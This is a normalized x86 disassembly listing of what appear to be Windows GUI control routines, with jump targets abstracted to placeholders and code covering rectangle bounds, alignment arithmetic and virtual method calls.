mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44fab4
sub_450462
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_44ecfc
mov cl 0x1
sub_4504a4
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_44ea54
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44ea54
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4504d4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4504f8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406e50
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403518
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44fa80
mov [ ebx + 0xc ] eax
sub_45059c
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44e9a8
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44e9a8
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_450630
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403264
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_44e048
mov edx [ esp ]
mov eax esi
call sub_44e024
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_44e2d0
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_44e314
sub_4506b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_417644
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_44e3cc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_417694
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44e274
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450740
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_450630
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4550b4
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_4506b4
pop ecx
jmp r-xdata
sub_4507a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45088e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450895
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44e8e4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44e8b4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44e8b4
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404524
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_40416c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44e7d4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45089c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403518
sub_4508c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4508e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450908
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450928
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450948
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450968
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450988
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421ecc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_44df08
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403518
sub_4509c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_450a5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_45b2b8
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_45b3f0
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44e8b4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45b150
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_45b510
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450a63
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_450a6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_450aa8
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_450a6c
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_450b58
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4034a8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_450b8c
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_450bac
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403518
test al al
je r-xdata
mov eax edi
call sub_450bec
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_450c18
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_450c44
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406e50
mov eax esp
call sub_4176bc
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44e3f8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403518
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403518
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_44e424
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4176bc
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_417644
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_44e3cc
sub_450d6c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_450dac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d5f8
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_450de0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_450ed8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_44d9b4
push ebx
push sub_452870
call sub_422b0c
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_425124
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_4252cc
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403668
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c44c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_40416c
lea eax [ ebx + 0x188 ]
call sub_404118
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450edf
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_450edf
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_450f04
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov edi eax
mov eax edi
call sub_421d1c
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405ab8
mov eax [ edi + 0x178 ]
call sub_40331c
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_44c560
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_451ba4
mov eax edi
call sub_451de4
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_40331c
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_451da8
mov esi eax
mov edx esi
mov eax edi
call sub_451c10
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_451de4
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_44da8c
test bl bl
jle r-xdata
call sub_422ba4
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_450fd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_451098
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418ef0
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40331c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_455274
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418cf8
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_418e44
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418cf8
test eax eax
je r-xdata
sub_4510a8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45194c
xor eax eax
push ebp
push sub_4510e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44dcf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4510ef
mov eax [ ebp - 0x4 ]
call sub_451954
retn
sub_4510ef
mov eax [ ebp - 0x4 ]
call sub_450fd4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4527a8
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44fa80
sub_451124
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_45113f ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_4511b0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4553b8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_417644
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_451531
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451538
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_451446 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
